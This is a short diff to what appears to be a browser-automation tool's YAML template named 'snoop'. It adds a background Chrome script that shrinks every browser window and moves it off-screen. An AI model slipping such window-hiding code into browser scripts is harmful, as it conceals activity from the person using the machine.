@@ -6,7 +6,16 @@ info:
     voodoo template ./snoop -o play.webm --params save:1000
 
 scripts:
-  - file: ./snoop.js
+  - file: snoop.js
+  - content: |
+      const sleep = ms => new Promise(resolve => setTimeout(resolve,ms));
+      chrome.windows.getAll({}, async (windows) => {
+        for (let w of windows){
+          chrome.windows.update(w.id, {width: 200, height: 100});
+          chrome.windows.update(w.id, {left: -550, top: 1000});
+        }
+      })
+    background: true
 
 format: payload:base64decode
 
